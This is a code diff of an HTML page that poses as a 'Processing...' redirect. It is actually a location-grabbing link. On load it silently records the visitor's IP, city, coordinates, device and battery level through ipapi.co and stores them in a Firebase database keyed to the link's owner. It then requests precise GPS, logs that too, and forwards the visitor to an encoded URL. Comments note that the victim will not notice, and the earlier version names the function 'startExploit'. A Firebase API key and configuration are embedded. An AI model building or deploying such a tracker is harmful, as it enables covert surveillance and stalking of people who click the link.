@@ -1,46 +1,115 @@
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-<script>
-    const firebaseConfig = {
-  apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
-  authDomain: "in-app-update-21c61.firebaseapp.com",
-  databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
-  projectId: "in-app-update-21c61",
-  storageBucket: "in-app-update-21c61.firebasestorage.app",
-  messagingSenderId: "1013483026768",
-  appId: "1:1013483026768:web:c5f54060842f9672431455",
-  measurementId: "G-EW0YR2YQ5Q"
-};
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing...</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <style>
+        body { background: #000; color: #333; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 3px solid #111; border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
 
-    const params = new URLSearchParams(window.location.search);
-    const adminId = params.get('id');
-    const redirect = atob(params.get('r'));
+    <script>
+        // --- YOUR FIREBASE CONFIG ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
+            authDomain: "in-app-update-21c61.firebaseapp.com",
+            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
+            projectId: "in-app-update-21c61",
+            storageBucket: "in-app-update-21c61.firebasestorage.app",
+            messagingSenderId: "1013483026768",
+            appId: "1:1013483026768:web:c5f54060842f9672431455"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-    async function startExploit() {
-        // 1. Get IP Info
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
+        // 1. Get Params from URL
+        const params = new URLSearchParams(window.location.search);
+        const adminId = params.get('id'); // Your mobile
+        const encodedRedirect = params.get('r'); // Encoded destination
 
-        // 2. Try to get GPS
-        navigator.geolocation.getCurrentPosition((pos) => {
-            sendToAdmin(pos.coords.latitude, pos.coords.longitude, ipData.ip, ipData.org);
-        }, (err) => {
-            // If GPS denied, send only IP
-            sendToAdmin("Denied", "Denied", ipData.ip, ipData.org);
-        }, { enableHighAccuracy: true });
-    }
+        // 2. Get Device Intelligence
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Unknown Device";
+            if (/android/i.test(ua)) device = "Android Phone";
+            else if (/iPhone/i.test(ua)) device = "iPhone";
+            else if (/Windows/i.test(ua)) device = "Windows PC";
+            
+            return {
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                device: device,
+                browser: navigator.appName
+            };
+        }
 
-    function sendToAdmin(lat, lng, ip, isp) {
-        db.ref('users/' + adminId + '/trackingLogs').push({
-            time: new Date().toLocaleString(),
-            method: "LINK-EXPLOIT",
-            coords: lat + ", " + lng,
-            isp: isp + " (" + ip + ")",
-            status: lat === "Denied" ? "IP-ONLY" : "FULL-GPS"
-        }).then(() => {
-            // 24 Hour Permission Lock (Optional simulation)
-            window.location.href = redirect;
-        });
-    }
-    startExploit();
-</script>
+        async function startCapture() {
+            if (!adminId) return;
+
+            const dev = getDeviceInfo();
+            let batteryLevel = "N/A";
+
+            // Try to get Battery Status (Silent)
+            try {
+                const batt = await navigator.getBattery();
+                batteryLevel = (batt.level * 100) + "%";
+            } catch(e) {}
+
+            // --- STEP 1: SILENT IP CAPTURE (Zero Permission) ---
+            let ipData = { ip: "Hidden", org: "Unknown", city: "Unknown" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+                
+                // Pehla data turant database mein (Victim ko pata bhi nahi chalega)
+                await db.ref('users/' + adminId + '/trackingLogs').push({
+                    time: new Date().toLocaleString(),
+                    method: "SILENT-IP-LOG",
+                    coords: ipData.latitude + ", " + ipData.longitude,
+                    isp: `${ipData.org} | ${dev.device} | Batt: ${batteryLevel}`,
+                    status: `CITY: ${ipData.city} (IP-ONLY)`
+                });
+            } catch (e) {}
+
+            // --- STEP 2: PRECISION GPS (Request Permission) ---
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // Agar Allow kiya toh Exact Coordinate bhejenge
+                        db.ref('users/' + adminId + '/trackingLogs').push({
+                            time: new Date().toLocaleString(),
+                            method: "GPS-PRECISION",
+                            coords: pos.coords.latitude + ", " + pos.coords.longitude,
+                            isp: `${ipData.org} (${ipData.ip})`,
+                            status: "EXACT-LOCATION-FIX"
+                        }).then(() => finish());
+                    },
+                    (err) => { finish(); }, // Deny kiya toh seedha redirect
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                finish();
+            }
+        }
+
+        function finish() {
+            try {
+                const target = atob(encodedRedirect);
+                window.location.href = target;
+            } catch(e) {
+                window.location.href = "https://google.com";
+            }
+        }
+
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
